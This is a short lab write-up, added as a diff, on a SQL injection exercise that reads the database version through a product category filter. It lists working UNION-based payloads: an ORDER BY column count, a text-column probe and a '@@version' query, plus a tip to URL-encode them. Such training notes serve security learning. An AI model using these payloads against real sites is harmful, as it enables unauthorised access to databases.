@@ -1,0 +1,27 @@
+Lab 08 - SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+SQL Injection - Product Category
+
+End Goal - display the database version
+
+Analysis:
+
+1) Find number of coloumns
+' order by 3# -> internal server error
+
+3 - 1 = 2
+
+
+2) Figure out which columns contains text
+' UNION select 'a', 'a'#
+
+
+3) Output the version
+' UNION select @@version, null#
+SELECT @@version
+
+8.0.31
+
+script.py <url>
+
+If not work , do url encode the sql_payload...
